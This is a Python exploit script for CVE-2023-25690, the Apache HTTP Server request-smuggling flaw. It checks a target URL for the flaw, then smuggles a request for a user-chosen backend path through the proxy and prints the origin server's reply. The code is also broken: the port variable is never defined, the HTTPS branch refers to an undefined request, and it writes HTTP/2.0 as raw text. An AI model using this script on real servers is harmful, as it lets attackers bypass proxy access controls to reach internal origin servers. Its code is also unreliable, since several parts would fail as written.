import socketserver
import requests
import argparse
import socket
from urllib.parse import urlparse



# Apache HTTP Server 2.4.0 < 2.4.55 

# Request Smuggling can cause to access orgin-server through proxy-server


# Vulnerable Check
def send_vulnerable_check_request(request, host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, int(port)))
        sock.sendall(request.encode())
        response = sock.recv(1024).decode() 
    
    response_lines = response.splitlines()
    status_line = response_lines[0]

    status_code = status_line.split()[1]  
    
    return status_code

# Send request with user's attack payload
def send_attack_request(host, attack_payload, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, int(port)))
    
    Encoded_payload = attack_payload.encode('utf-8')
    
    sock.sendall(Encoded_payload)
    response = sock.recv(4096)
    
    res = response.decode('utf-8') 
       
    return res



parser = argparse.ArgumentParser(usage="""CVE-2023-25690.py -u https://*.*.*.*/test/directory -m y""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--mode', '-m', help='Exploit mode (y/n)', required=False)
args = parser.parse_args()

#Parsing URL as protocol, host, path
parsed_url = urlparse(args.URL)


protocol = parsed_url.scheme 
host = parsed_url.netloc     
path = parsed_url.path         


# Send payload as http protocol version
if protocol == "http":
    
    request_http = f"GET {path} HTTP/1.1\r\nHost: localhost\r\n\r\nGET /SMUGGLED HTTP/1.1"    
    
    status_http = send_vulnerable_check_request(request_http, host, port)
    
    if status_http == "200":
        print("[+] Detected Vulnerability : True\r\n")
        
        if args.mode:
            m = args.mode.strip().lower()
            
            if m == 'y':
                print("-" * 100)
                print(f'''[Vulnerable Check Request]\r\n{request_http}\nHost: Backend
                        ''')
                
                print("-" * 100)
                user_payload_s = input("What do you want get backend directory?")
                attack_payload_s = f"GET {path} HTTP/1.1\r\nHost: localhost\r\n\r\nGET {user_payload_s} HTTP/1.1\r\n\r\n"
                
                print("\r")
                print("-" * 100)
                print("[It is your full payload] \n" + attack_payload_s + "Host: Backend\n")
                
                attack_response_s = send_attack_request(host, attack_payload_s, port)
                
                print("-" * 100)
                print("Backend Directory result: \n" + attack_response_s)  
            elif m == 'n':
                print("Checking vulnerability finish.")

            else:
                print("Invalid mode choice")
          
    else:
        print("[-] Detected Vulnerability : False")
        
elif protocol == "https":
    
    request_https = f"GET {path} HTTP/2.0\r\nHost: localhost\r\n\r\nGET /SMUGGLED HTTP/2.0"
    
    status_https = send_vulnerable_check_request(request_https, host, port)
    
    if status_https == "200":
        print("[+] Detected Vulnerability : True\r\n")
        
        if args.mode:
            m = args.mode.strip().lower()
            
            if m == 'y':
                print("-" * 100)
                print(f'''[Vulnerable Check Request]\r\n{request}\nHost: Backend
                        ''')
                
                print("-" * 100)
                user_payload = input("What do you want get backend directory?")
                attack_payload = f"GET {path} HTTP/2.0\r\nHost: localhost\r\n\r\nGET {user_payload} HTTP/2.0\r\n\r\n"
                
                print("\r")
                print("-" * 100)
                print("[It is your full payload] \n" + attack_payload + "Host: Backend\n")
                
                attack_response = send_attack_request(host, attack_payload, port)
                
                print("-" * 100)
                print("Backend Directory result: \n" + attack_response)
            elif m == 'n':
                print("Checking vulnerability finish.")

            else:
                print("Invalid mode choice")   
        
    else:
        print("[-] Detected Vulnerability : False")
else:
    print("Error occured in Vulnerable Check")